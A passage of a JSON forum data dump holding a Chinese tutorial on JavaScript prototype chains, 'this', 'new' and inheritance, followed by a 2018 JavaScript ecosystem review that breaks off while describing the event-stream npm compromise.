star","last_reply_at":"2019-02-21T04:42:39.196Z","good":false,"top":false,"reply_count":3,"visit_count":609,"create_at":"2019-02-20T03:31:34.203Z","author":{"loginname":"danielsss","avatar_url":"https://avatars3.githubusercontent.com/u/5127897?v=4&s=120"}},{"id":"5c60e10605cc322e7b137bef","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> 理解JS继承。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000016542417\">搞懂 JavaScript 继承原理</a></li>\n<li>作者：<a href=\"https://segmentfault.com/a/1190000017794020\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p>在理解继承之前，需要知道 js 的三个东西：</p>\n<ul>\n<li>\n<ol>\n<li>什么是 JS 原型链</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>this 的值到底是什么</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>JS 的 new 到底是干什么的</li>\n</ol>\n</li>\n</ul>\n<h3>1. 什么是 JS 原型链？</h3>\n<p>我们知道 JS 有对象，比如</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { name: &quot;obj&quot; };\n</code></pre><p>我们通过控制台把 obj 打印出来：</p>\n<p><img src=\"https://image.fundebug.com/2019-02-10-01.png\" alt></p>\n<p>我们会发现 obj 已经有几个属性（方法）了。<strong>那么问题来了：valueOf / toString / constructor 是怎么来？我们并没有给 obj.valueOf 赋值呀。</strong></p>\n<p>上面这个图有点难懂，我手画一个示意图：</p>\n<p><img src=\"https://image.fundebug.com/2019-02-10-02.png\" alt></p>\n<p>我们发现控制台打出来的结果是：</p>\n<ul>\n<li>obj 本身有一个属性 name (这是我们给它加的)</li>\n<li>obj 还有一个属性叫做 <strong>proto</strong>(它是一个对象)</li>\n<li>obj 还有一个属性，包括 valueOf, toString, constructor 等</li>\n<li>obj.<strong>proto</strong>其实也有一个叫做<strong>proto</strong>的属性(console.log 没有显示)，值为 null</li>\n</ul>\n<p>现在回到我们的问题：obj 为什么会拥有 valueOf / toString / constructor 这几个属性？</p>\n<p><strong>答案： 这跟 <strong>proto</strong>有关 。</strong></p>\n<p>当我们「读取」 obj.toString 时，JS 引擎会做下面的事情：</p>\n<ul>\n<li>看看 obj 对象本身有没有 toString 属性。没有就走到下一步。</li>\n<li>看看 obj.<strong>proto</strong> 对象有没有 toString 属性， 发现 obj.<strong>proto</strong> 有 toString 属性， 于是找到了，所以 obj.toString 实际就是第 2 步中找到的 obj.<strong>proto</strong>.toString。</li>\n<li>如果 obj.<strong>proto</strong>没有，那么浏览器会继续查看 obj.<strong>proto</strong>.<strong>proto</strong></li>\n<li>如果 obj.<strong>proto</strong>.<strong>proto</strong>也没有，那么浏览器会继续查看 obj.<strong>proto</strong>.<strong>proto</strong>.<strong>proto</strong></li>\n<li>直到找到 toString 或者 <strong>proto</strong> 为 null。</li>\n</ul>\n<p>上面的过程，就是「读」属性的「搜索过程」。而这个「搜索过程」，是连着由 <strong>proto</strong> 组成的链子一直走的。<strong>这个链子，就叫做「原型链」。</strong></p>\n<h4>共享原型链</h4>\n<p>现在我们还有另一个对象</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj2 = { name: &quot;obj2&quot; };\n</code></pre><p>如图:</p>\n<p><img src=\"https://image.fundebug.com/2019-02-10-03.png\" alt></p>\n<p>那么 obj.toString 和 obj2.toString 其实是同一东西， 也就是 obj2.<strong>proto</strong>.toString。</p>\n<p>说白了，我们改其中的一个 <strong>proto</strong>.toString ，那么另外一个其实也会变!</p>\n<h4>差异化</h4>\n<p>如果我们想让 obj.toString 和 obj2.toString 的行为不同怎么做呢？\n直接赋值就好了：</p>\n<pre class=\"prettyprint language-javascript\"><code>obj.toString = function() {\n    return &quot;新的 toString 方法&quot;;\n};\n</code></pre><p><img src=\"https://image.fundebug.com/2019-02-10-04.png\" alt></p>\n<p><strong>小结</strong></p>\n<ul>\n<li>[读]属性时会沿着原型链搜索</li>\n<li>[新增]属性时不会去看原型链</li>\n</ul>\n<h3>2. this 的值到底是什么</h3>\n<p>你可能遇到过这样的 JS 面试题：</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n    foo: function() {\n        console.log(this);\n    }\n};\n\nvar bar = obj.foo;\nobj.foo(); &#x2F;&#x2F; 打印出的 this 是 obj\nbar(); &#x2F;&#x2F; 打印出的 this 是 window\n</code></pre><p>请解释最后两行函数的值为什么不一样。</p>\n<h4>函数调用</h4>\n<p>JS（ES5）里面有三种函数调用形式：</p>\n<pre class=\"prettyprint language-javascript\"><code>func(p1, p2);\nobj.child.method(p1, p2);\nfunc.call(context, p1, p2); &#x2F;&#x2F; 先不讲 apply\n</code></pre><p>一般，初学者都知道前两种形式，而且认为前两种形式「优于」第三种形式。\n我们方方老师大姥说了，你一定要记住，第三种调用形式，才是正常调用形式：</p>\n<pre class=\"prettyprint language-javascript\"><code>func.call(context, p1, p2);\n</code></pre><p>其他两种都是语法糖，可以等价地变为 call 形式：</p>\n<p>func(p1, p2)等价于 func.call(undefined, p1, p2);</p>\n<p>obj.child.method(p1, p2) 等价于 obj.child.method.call(obj.child, p1, p2);</p>\n<p>至此我们的函数调用只有一种形式：</p>\n<pre class=\"prettyprint language-javascript\"><code>func.call(context, p1, p2);\n</code></pre><p><strong>这样，this 就好解释了</strong> this 就是上面 context。</p>\n<p>this 是你 call 一个函数时传的 context，由于你从来不用 call 形式的函数调用，所以你一直不知道。</p>\n<p>先看 func(p1, p2) 中的 this 如何确定：</p>\n<pre class=\"prettyprint language-javascript\"><code>当你写下面代码时;\n\nfunction func() {\n    console.log(this);\n}\n\nfunc();\n等价于;\n\nfunction func() {\n    console.log(this);\n}\n\nfunc.call(undefined); &#x2F;&#x2F; 可以简写为 func.call()\n</code></pre><p>按理说打印出来的 this 应该就是 undefined 了吧，但是浏览器里有一条规则：</p>\n<blockquote>\n<p>如果你传的 context 就 null 或者 undefined，那么 window 对象就是默认的 context（严格模式下默认 context 是 undefined）</p>\n</blockquote>\n<p>因此上面的打印结果是 window。如果你希望这里的 this 不是 window，很简单：</p>\n<pre class=\"prettyprint language-javascript\"><code>func.call(obj); &#x2F;&#x2F; 那么里面的 this 就是 obj 对象了\n</code></pre><p>回到题目：</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n    foo: function() {\n        console.log(this);\n    }\n};\n\nvar bar = obj.foo;\nobj.foo(); &#x2F;&#x2F; 转换为 obj.foo.call(obj)，this 就是 obj\nbar();\n&#x2F;&#x2F; 转换为 bar.call()\n&#x2F;&#x2F; 由于没有传 context\n&#x2F;&#x2F; 所以 this 就是 undefined\n&#x2F;&#x2F; 最后浏览器给你一个默认的 this —— window 对象\n</code></pre><h4>[ ] 语法</h4>\n<pre class=\"prettyprint language-javascript\"><code>function fn() {\n    console.log(this);\n}\nvar arr = [fn, fn2];\narr[0](); &#x2F;&#x2F; 这里面的 this 又是什么呢？\n</code></pre><p>我们可以把 arr<a href=\"https://segmentfault.com/a/1190000016542417#\">0</a> 想象为 arr.0( )，虽然后者的语法错了，但是形式与转换代码里的 obj.child.method(p1, p2) 对应上了，于是就可以愉快的转换了：</p>\n<pre class=\"prettyprint language-javascript\"><code>arr[0]();\n</code></pre><p>假想为 arr.0()\n然后转换为 arr.0.call(arr)\n那么里面的 this 就是 arr 了 :)</p>\n<p><strong>小结：</strong></p>\n<ul>\n<li>this 就是你 call 一个函数时，传入的第一个参数。</li>\n<li>如果你的函数调用不是 call 形式， 请将其转换为 call 形式</li>\n</ul>\n<p><strong>码部署后可能存在的BUG没法实时知道，事后为了解决这些BUG，花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具 <a href=\"https://www.fundebug.com/?utm_source=xiaozhi\">Fundebug</a>。</strong></p>\n<h3>3. JS 的 new 到底是干什么的？</h3>\n<p>我们声明一个士兵，具有如下属性：</p>\n<pre class=\"prettyprint language-javascript\"><code>var 士兵 = {\n    ID: 1, &#x2F;&#x2F; 用于区分每个士兵\n    兵种: &quot;美国大兵&quot;,\n    攻击力: 5,\n    生命值: 42,\n    行走: function() {\n        &#x2F;*走俩步的代码*&#x2F;\n    },\n    奔跑: function() {\n        &#x2F;*狂奔的代码*&#x2F;\n    },\n    死亡: function() {\n        &#x2F;*Go die*&#x2F;\n    },\n    攻击: function() {\n        &#x2F;*糊他熊脸*&#x2F;\n    },\n    防御: function() {\n        &#x2F;*护脸*&#x2F;\n    }\n};\n</code></pre><p>我们制造一个士兵， 只需要这样：</p>\n<pre class=\"prettyprint language-javascript\"><code>兵营.制造(士兵);\n</code></pre><p>如果需要制造 100 个士兵怎么办呢？</p>\n<pre class=\"prettyprint language-javascript\"><code>循环 100 次吧：\n\nvar 士兵们 = []\nvar 士兵\nfor(var i=0; i&lt;100; i++){\n  士兵 = {\n    ID: i, &#x2F;&#x2F; ID 不能重复\n    兵种:&quot;美国大兵&quot;,\n    攻击力:5,\n    生命值:42,\n    行走:function(){ &#x2F;*走俩步的代码*&#x2F;}，\n    奔跑:function(){ &#x2F;*狂奔的代码*&#x2F;  },\n    死亡:function(){ &#x2F;*Go die*&#x2F;    },\n    攻击:function(){ &#x2F;*糊他熊脸*&#x2F;   },\n    防御:function(){ &#x2F;*护脸*&#x2F;       }\n  }\n  士兵们.push(士兵)\n}\n\n兵营.批量制造(士兵们)\n</code></pre><p>哎呀，看起来好简单</p>\n<h4>质疑</h4>\n<p>上面的代码存在一个问题：浪费了很多内存</p>\n<ul>\n<li>行走、奔跑、死亡、攻击、防御这五个动作对于每个士兵其实是一样的，只需要各自引用同一个函数就可以了，没必要重复创建 100 个行走、100 个奔跑……</li>\n<li>这些士兵的兵种和攻击力都是一样的，没必要创建 100 次。</li>\n<li>只有 ID 和生命值需要创建 100 次，因为每个士兵有自己的 ID 和生命值。</li>\n</ul>\n<h4>改进</h4>\n<p>通过第一节可以知道 ，我们可以通过原型链来解决重复创建的问题：我们先创建一个「士兵原型」，然后让「士兵」的 <strong>proto</strong> 指向「士兵原型」。</p>\n<pre class=\"prettyprint language-javascript\"><code>var 士兵原型 = {\n  兵种:&quot;美国大兵&quot;,\n  攻击力:5,\n  行走:function(){ &#x2F;*走俩步的代码*&#x2F;}，\n  奔跑:function(){ &#x2F;*狂奔的代码*&#x2F;  },\n  死亡:function(){ &#x2F;*Go die*&#x2F;    },\n  攻击:function(){ &#x2F;*糊他熊脸*&#x2F;   },\n  防御:function(){ &#x2F;*护脸*&#x2F;       }\n}\n\nvar 士兵们 = []\nvar 士兵\nfor(var i=0; i&lt;100; i++){\n  士兵 = {\n    ID: i, &#x2F;&#x2F; ID 不能重复\n    生命值:42\n  }\n\n  &#x2F;*实际工作中不要这样写，因为 __proto__ 不是标准属性*&#x2F;\n  士兵.__proto__ = 士兵原型\n\n  士兵们.push(士兵)\n}\n\n兵营.批量制造(士兵们)\n</code></pre><h4>优雅？</h4>\n<p>有人指出创建一个士兵的代码分散在两个地方很不优雅，于是我们用一个函数把这两部分联系起来：</p>\n<pre class=\"prettyprint language-javascript\"><code>function 士兵(ID){\n  var 临时对象 = {};\n  临时对象.__proto__ = 士兵.原型;\n  临时对象.ID = ID;\n  临时对象.生命值 = 42;\n\n  return 临时对象;\n}\n\n士兵.原型 = {\n  兵种:&quot;美国大兵&quot;,\n  攻击力:5,\n  行走:function(){ &#x2F;*走俩步的代码*&#x2F;}，\n  奔跑:function(){ &#x2F;*狂奔的代码*&#x2F;  },\n  死亡:function(){ &#x2F;*Go die*&#x2F;    },\n  攻击:function(){ &#x2F;*糊他熊脸*&#x2F;   },\n  防御:function(){ &#x2F;*护脸*&#x2F;       }\n}\n\n&#x2F;&#x2F; 保存为文件：士兵.js\n\n 然后就可以愉快地引用「士兵」来创建士兵了：\n\nvar 士兵们 = []\nfor(var i=0; i&lt;100; i++){\n  士兵们.push(士兵(i))\n}\n\n兵营.批量制造(士兵们)\n</code></pre><p>JS 之父看到大家都这么搞，觉得何必呢，我给你们个糖吃，于是 JS 之父创建了 new 关键字，可以让我们少写几行代码：</p>\n<p><img src=\"https://image.fundebug.com/2019-02-10-05.png\" alt></p>\n<p><strong>只要你在士兵前面使用 new 关键字，那么可以少做四件事情：</strong></p>\n<ol>\n<li>不用创建临时对象，因为 new 会帮你做（你使用「this」就可以访问到临时对象）；</li>\n<li>不用绑定原型，因为 new 会帮你做(new 为了知道原型在哪，所以指定原型的名字 prototype);</li>\n<li>不用 return 临时对象，因为 new 会帮你做；</li>\n<li>不要给原型想名字了，因为 new 指定名字为 prototype。</li>\n</ol>\n<h4>这一次用 new 来写</h4>\n<pre class=\"prettyprint language-javascript\"><code>function 士兵(ID){\n  this.ID = ID\n  this.生命值 = 42\n}\n\n士兵.prototype = {\n  兵种:&quot;美国大兵&quot;,\n  攻击力:5,\n  行走:function(){ &#x2F;*走俩步的代码*&#x2F;},\n  奔跑:function(){ &#x2F;*狂奔的代码*&#x2F;  },\n  死亡:function(){ &#x2F;*Go die*&#x2F;    },\n  攻击:function(){ &#x2F;*糊他熊脸*&#x2F;   },\n  防御:function(){ &#x2F;*护脸*&#x2F;       }\n}\n\n&#x2F;&#x2F; 保存为文件：士兵.js\n然后是创建士兵（加了一个 new 关键字）：\n\nvar 士兵们 = []\nfor(var i=0; i&lt;100; i++){\n  士兵们.push(new 士兵(i))\n}\n\n兵营.批量制造(士兵们)\n</code></pre><p><strong>new 的作用，就是省那么几行代码。（也就是所谓的语法糖）</strong></p>\n<h4>注意 constructor 属性</h4>\n<p>new 操作为了记录「临时对象是由哪个函数创建的」，所以预先给「士兵.prototype」加了一个 constructor 属性：</p>\n<pre class=\"prettyprint language-javascript\"><code>士兵.prototype = {\n    constructor: 士兵\n};\n</code></pre><p>如果你重新对「士兵.prototype」赋值，那么这个 constructor 属性就没了，所以你应该这么写：</p>\n<pre class=\"prettyprint language-javascript\"><code>士兵.prototype.兵种 = &quot;美国大兵&quot;;\n士兵.prototype.攻击力 = 5;\n士兵.prototype.行走 = function() {\n    &#x2F;*走俩步的代码*&#x2F;\n};\n士兵.prototype.奔跑 = function() {\n    &#x2F;*狂奔的代码*&#x2F;\n};\n士兵.prototype.死亡 = function() {\n    &#x2F;*Go die*&#x2F;\n};\n士兵.prototype.攻击 = function() {\n    &#x2F;*糊他熊脸*&#x2F;\n};\n士兵.prototype.防御 = function() {\n    &#x2F;*护脸*&#x2F;\n};\n</code></pre><p>或者你也可以自己给 constructor 重新赋值：</p>\n<pre class=\"prettyprint language-javascript\"><code>士兵.prototype = {\n    constructor: 士兵,\n    兵种: &quot;美国大兵&quot;,\n    攻击力: 5,\n    行走: function() {\n        &#x2F;*走俩步的代码*&#x2F;\n    },\n    奔跑: function() {\n        &#x2F;*狂奔的代码*&#x2F;\n    },\n    死亡: function() {\n        &#x2F;*Go die*&#x2F;\n    },\n    攻击: function() {\n        &#x2F;*糊他熊脸*&#x2F;\n    },\n    防御: function() {\n        &#x2F;*护脸*&#x2F;\n    }\n};\n</code></pre><h3>四、继承</h3>\n<p><strong>继承的本质就是上面的讲的原型链</strong></p>\n<h4>1)借助构造函数实现继承</h4>\n<pre class=\"prettyprint language-javascript\"><code>function Parent1() {\n    this.name = &quot;parent1&quot;;\n}\n\nParent1.prototype.say = function() {};\n\nfunction Child1() {\n    Parent1.call(this);\n    this.type = &quot;child&quot;;\n}\n\nconsole.log(new Child1());\n</code></pre><p>打印结果：</p>\n<p><img src=\"https://image.fundebug.com/2019-02-10-06.png\" alt></p>\n<p>这个主要是借用 call 来改变 this 的指向，通过 call 调用 Parent ，此时 Parent 中的 this 是指 Child1。有个缺点，从打印结果看出 Child1 并没有 say 方法，所以这种只能继承父类的实例属性和方法，不能继承原型属性/方法。</p>\n<h4>2)借助原型链实现继承</h4>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;**\n * 借助原型链实现继承\n *&#x2F;\nfunction Parent2() {\n    this.name = &quot;parent2&quot;;\n    this.play = [1, 2, 3];\n}\n\nfunction Child2() {\n    this.type = &quot;child2&quot;;\n}\nChild2.prototype = new Parent2();\n\nconsole.log(new Child2());\n\nvar s1 = new Child2();\nvar s2 = new Child2();\n</code></pre><p>打印：</p>\n<p><img src=\"https://image.fundebug.com/2019-02-10-07.png\" alt></p>\n<p>通过一讲的，我们知道要共享莫些属性，需要 对象.<strong>proto</strong> = 父亲对象的.prototype,但实际上我们是不能直接 操作<strong>proto</strong>，这时我们可以借用 new 来做，所以\nChild2.prototype = new Parent2(); &lt;=&gt; Child2.prototype.<strong>proto</strong> = Parent2.prototype; 这样我们借助 new 这个语法糖，就可以实现原型链继承。但这里有个总是，如打印结果，我们给 s1.play 新增一个值 ，s2 也跟着改了。所以这个是原型链继承的缺点，原因是 s1.<strong>pro</strong> 和 s2.<strong>pro</strong>指向同一个地址即 父类的 prototype。</p>\n<h4>3)组合方式实现继承</h4>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;**\n * 组合方式\n *&#x2F;\n\nfunction Parent3() {\n    this.name = &quot;parent3&quot;;\n    this.play = [1, 2, 3];\n}\n\nParent3.prototype.say = function() {};\n\nfunction Child3() {\n    Parent3.call(this);\n    this.type = &quot;child3&quot;;\n}\n\nChild3.prototype = new Parent3();\n\nvar s3 = new Child3();\nvar s4 = new Child3();\ns3.play.push(4);\nconsole.log(new Child3());\nconsole.log(s3.play, s4.play);\n</code></pre><p>打印:</p>\n<p><img src=\"https://image.fundebug.com/2019-02-10-08.png\" alt></p>\n<p>将 1 和 2 两种方式组合起来，就可以解决 1 和 2 存在问题，这种方式为组合继承。这种方式有点缺点就是我实例一个对象的时， 父类 new 了两次，一次是 var s3 = new Child3()对应 Child3.prototype = new Parent3()还要 new 一次。</p>\n<h4>4)组合继承的优化 1</h4>\n<pre class=\"prettyprint language-javascript\"><code>function Parent4() {\n    this.name = &quot;parent4&quot;;\n    this.play = [1, 2, 3];\n}\n\nParent4.prototype.say = function() {};\n\nfunction Child4() {\n    Parent4.call(this);\n    this.type = &quot;child4&quot;;\n}\n\nChild4.prototype = Parent4.prototype;\n\nvar s5 = new Child4();\nvar s6 = new Child4();\n</code></pre><p>这边主要为 Child4.prototype = Parent4.prototype， 因为我们通过构造函数就可以拿到所有属性和实例的方法，那么现在我想继承父类的原型对象，所以你直接赋值给我就行，不用在去 new 一次父类。其实这种方法还是有问题的，如果我在控制台打印以下两句:</p>\n<p><img src=\"https://image.fundebug.com/2019-02-10-09.png\" alt></p>\n<p>从打印可以看出，此时我是没有办法区分一个对象 是直接 由它的子类实例化还是父类呢？我们还有一个方法判断来判断对象是否是类的实例，那就是用 constructor,我在控制台打印以下内容：</p>\n<p><img src=\"https://image.fundebug.com/2019-02-10-10.png\" alt></p>\n<p>咦，你会发现它指向的是父类 ，这显然不是我们想要的结果， 上面讲过我们 prototype 里面有一个 constructor, 而我们此时子类的 prototype 指向是 父类的 prototye ,而父类 prototype 里面的 contructor 当然是父类自己的，这个就是产生该问题的原因。</p>\n<h4>组合继承的优化 2</h4>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;**\n * 组合继承的优化2\n *&#x2F;\n\nfunction Parent5() {\n    this.name = &quot;parent4&quot;;\n    this.play = [1, 2, 3];\n}\n\nParent5.prototype.say = function() {};\n\nfunction Child5() {\n    Parent5.call(this);\n    this.type = &quot;child4&quot;;\n}\n\nChild5.prototype = Object.create(Parent5.prototype);\n</code></pre><p>这里主要使用<strong>Object.create()</strong>，它的作用是将对象继承到<strong>proto</strong>属性上。举个例子：</p>\n<pre class=\"prettyprint language-javascript\"><code>var test = Object.create({ x: 123, y: 345 });\nconsole.log(test); &#x2F;&#x2F;{}\nconsole.log(test.x); &#x2F;&#x2F;123\nconsole.log(test.__proto__.x); &#x2F;&#x2F;3\nconsole.log(test.__proto__.x === test.x); &#x2F;&#x2F;true\n</code></pre><p>那大家可能说这样解决了吗，其实没有解决,因为这时 Child5.prototype 还是没有自己的 constructor,它要找的话还是向自己的原型对象上找最后还是找到 Parent5.prototype, constructor 还是 Parent5 ,所以要给 Child5.prototype 写自己的 constructor:</p>\n<pre class=\"prettyprint language-javascript\"><code>Child5.prototype = Object.create(Parent5.prototype);\nChild5.prototype.constructor = Child5;\n</code></pre><h4>参考</h4>\n<ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/23090041?refer=study-fe\">什么是 JS 原型链？</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/23804247\">this 的值到底是什么？一次说清楚</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/23987456?refer=study-fe\">JS 的 new 到底是干什么的？</a></li>\n</ul>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了10亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n</div>","title":"搞懂 JavaScript 继承原理","last_reply_at":"2019-02-21T03:46:03.807Z","good":false,"top":false,"reply_count":5,"visit_count":1220,"create_at":"2019-02-11T02:42:14.469Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c2190c176c4964062a1d641","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> 对JSer来说，这是很有意思的1年。</p>\n<p>本文灵感来自<a href=\"https://javascriptweekly.com/\">JavaScript Weekly</a>周报，欢迎大家订阅。</p>\n<h3>The State of JavaScript 2018</h3>\n<p><a href=\"https://2018.stateofjs.com/\">The State of JavaScript</a>调研已经连续做了3年(<a href=\"http://2016.stateofjs.com/\">2016</a>, <a href=\"https://2017.stateofjs.com/\">2017</a>, <a href=\"https://2018.stateofjs.com\">2018</a>)，<a href=\"https://2018.stateofjs.com/\">今年</a>一共调研了2万多个JS开发者。有这样一些有意思的发现：</p>\n<ul>\n<li>绝大多数开发者都用过ES6，同时TypeScript也越来越流行了；</li>\n<li>React依然最流行的前端框架，同时Vue也越来越受欢迎了；</li>\n<li>Express依然是最流行的Node.js框架(Node 8已经支持async函数了，Koa的价值应该少了很多)；</li>\n<li>Visual Studio code远远超越Sublime，成为最流行的JS编辑器；</li>\n</ul>\n<p>作为一个后端用Express框架，尽量使用最新的ECMAScript语法，而前端用着TypeScript，不过框架还是AngularJS 1(这事要怪版本帝Angular不向后兼容)，抛弃价值70刀的Sublime，今年加入VS code阵营的JSer，我也是算是够主流了吧！那你呢？</p>\n<h3>ECMAScript 2018</h3>\n<p>TC39(ECMAScript标准委员会)这些年越来越勤快了，从2015年(ES6)开始，每年发布一个新的ECMAScipt标准。今年大佬们继续忙于处理各种<a href=\"https://github.com/tc39/proposals\">proposal</a>。<a href=\"https://www.ecma-international.org/publications/standards/Ecma-262.htm\">ECMAScript 2018</a>，即ES9，则在6月如期发布了，其新增的特性并不多：</p>\n<p><strong>主要新特性:</strong></p>\n<ul>\n<li><a href=\"http://2ality.com/2016/10/asynchronous-iteration.html\">Asynchronous Iteration</a></li>\n<li><a href=\"http://2ality.com/2016/10/rest-spread-properties.html\">Rest/Spread Properties</a></li>\n</ul>\n<p><strong>新的正则表达式特性</strong>:</p>\n<ul>\n<li><a href=\"http://2ality.com/2017/05/regexp-named-capture-groups.html\">RegExp named capture groups</a></li>\n<li><a href=\"http://2ality.com/2017/07/regexp-unicode-property-escapes.html\">RegExp Unicode Property Escapes</a></li>\n<li><a href=\"http://2ality.com/2017/05/regexp-lookbehind-assertions.html\">RegExp Lookbehind Assertions</a></li>\n<li><a href=\"http://2ality.com/2017/07/regexp-dotall-flag.html\"><code>s</code> (<code>dotAll</code>) flag for regular expressions</a></li>\n</ul>\n<p><strong>其他新特性</strong>:</p>\n<ul>\n<li><a href=\"http://2ality.com/2017/07/promise-prototype-finally.html\"><code>Promise.prototype.finally()</code></a></li>\n<li><a href=\"http://2ality.com/2016/09/template-literal-revision.html\">Template Literal Revision</a></li>\n</ul>\n<p>如果想了解ES9的细节，阔以看看<a href=\"http://dr-axel.de/\">Axel Rauschmayer</a>博士写的<a href=\"http://exploringjs.com/es2018-es2019/toc.html\">Exploring ES2018 and ES2019</a>。</p>\n<h3>Node 10</h3>\n<p>Node 10在4月<a href=\"https://nodejs.org/en/blog/release/v10.0.0/\">发布</a>并且在10月成为<a href=\"https://medium.com/%5B@nodejs%5D(/user/nodejs)/october-brings-node-js-10-x-to-lts-and-node-js-11-to-current-ae19f8f12b51\">LTS</a>，即长期支持版本。</p>\n<p>Node 10使用了新的<a href=\"https://v8.dev/\">V8引擎</a>6.8，因此性能提升了很多，比如<a href=\"https://v8.dev/blog/fast-async\">Promise与Async函数的性能提升就非常明显</a>，因此建议大家升级。</p>\n<p>Node新版本的<a href=\"https://github.com/nodejs/release\">发布日期</a>一直非常稳定，做到这一点也是不容易啊！</p>\n<p><img src=\"https://image.fundebug.com/2018-12-24-node.png\" alt></p>\n<h3>Vue 3.0</h3>\n<p>在<a href=\"https://vuetoronto.com/\">Vue.js Conference Toronto 2018</a>上，尤雨溪发表了主题演讲<a href=\"https://docs.google.com/presentation/d/1yhPGyhQrJcpJI2ZFvBme3pGKaGNiLi709c37svivv0o/edit#slide=id.p\">Vue 3.0 Updates</a>，新版本将会有这些变化：</p>\n<ul>\n<li>更快</li>\n<li>更小</li>\n<li>更易于维护</li>\n<li>更多的原生支持</li>\n<li><a href=\"https://www.zhihu.com/question/46397274/answer/101193678\">放弃Flow，使用TypeScript</a></li>\n</ul>\n<p>Vue 3.0<a href=\"https://medium.com/the-vue-point/plans-for-the-next-iteration-of-vue-js-777ffea6fabf\">预计将在2019发布</a>，大家期待吧！</p>\n<h3>Babel 7</h3>\n<p>2年多时间commit了4000多次，<a href=\"https://babeljs.io/blog/2018/08/27/7.0.0\">Babel 7终于发布了</a>，新增了下面这些特性：</p>\n<ul>\n<li><a href=\"https://www.npmjs.com/package/babel-upgrade\">babel-upgrade</a>: 升级Babel的工具；</li>\n<li><a href=\"https://babeljs.io/docs/en/next/config-files#project-wide-configuration\">babel.config.js</a>：学习ESLint与Webpack，使用JS文件配置；</li>\n<li><a href=\"https://babeljs.io/docs/en/options#overrides\">overrides</a>：允许同一个项目使用不同的Babel配置，例如前端代码的targets为Chrome 60，而后端代码的targets为Node 8；</li>\n<li>…</li>\n</ul>\n<p><img src=\"https://image.fundebug.com/2018-12-24-babel.png\" alt></p>\n<p>主流浏览器对新的ECMAScript特性已经支持得不错了，不过还是存在并且永远存在很多非主流浏览器，于是我们还是离不开神奇的Babel。</p>\n<h3>jQuery 3.3.0</h3>\n<p>曾经风靡一时的<a href=\"http://blog.jquery.com/2018/01/19/jquery-3-3-0-a-fragrant-bouquet-of-deprecations-and-is-that-a-new-feature/\">jQuery发布了3.3.0</a>，这个版本放弃了(deprecated)一系列方法：</p>\n<ul>\n<li>jQuery.now</li>\n<li>jQuery.isWindow</li>\n<li>jQuery.camelCase</li>\n<li>jQuery.proxy</li>\n<li>jQuery.type</li>\n<li>jQuery.isNumeric</li>\n<li>jQuery.isFunction</li>\n<li>Event aliases</li>\n</ul>\n<p>这些方法大多会在jQuery 4.0中被删除，因此jQuery官方鼓励大家使用替代的方法。</p>\n<p>从这个更新也能看出端倪，jQuery时代已经逐渐过去了，<a href=\"https://githubengineering.com/removing-jquery-from-github-frontend/\">GitHub的极客们干脆完全抛弃了jQuery</a>。</p>\n<h3>V8引擎10周年</h3>\n<p>强大的<a href=\"https://v8.dev/blog/10-years\">V8引擎已经发布10周年了</a>，它的命名灵感来自超级性能车的V8引擎，果然名副其实！其性能一直稳步提高：</p>\n<p><img src=\"https://image.fundebug.com/2018-12-24-v8.png\" alt></p>\n<p>V8引擎当初是为Chrome浏览器开发的，但是早已成为一个独立的项目。国内的众多浏览器，包括搜狗、360、猎豹、QQ、百度、UC都是基于<a href=\"https://zh.wikipedia.org/wiki/Chromium\">Chromium</a>浏览器开发，而Chromium相当于开源版本的Chrome，自然也是基于V8引擎的。因此，众多&quot;国产&quot;浏览器实际上都是基于V8的。融资了2.5亿元红芯浏览器也不例外，<a href=\"https://www.pingwest.com/a/176061\">他们干脆打包了Chrome浏览器的安装包</a>，果然有钱任性！还有，就连浏览器界的一朵奇葩<a href=\"https://www.ifanr.com/1138933\">Microsoft也投靠了Chromium阵营</a>。</p>\n<p>另外，Node.js也是基于V8引擎的。</p>\n<h3>NPM模块<a href=\"https://github.com/dominictarr/event-stream\">event-stream</a>被黑客攻击</h3>\n<p>这件事闹得沸沸扬扬，不过只是有很多噱头，如果<a href=\"https://blog.fundebug.com/2018/12/03/how-does-javascript-hacker-steal-bitcoin/\">认真分析黑客干了什么</a>，其真实影响没那么大，至少Vue开发者没啥好担心的：</p>\n<ul>\n<li>比特币钱包<a href=\"https://github.com/bitpay/copay\">copay</a>依赖<a href=\"https://github.com/dominictarr/event-stream\">event-stream</a>模块；</li>\n<li>黑客从骗取了<a href=\"https://github.com/dominictarr/event-stream\">event-stream</a>模块的npm发布权限；</li>\n<li>黑客为<a href=\"https://github.com/dominictarr/event-stream\">event-stream</a>模块添加了依赖<a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>；</li>\n<li><a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>含有黑客代码，仅会在<a 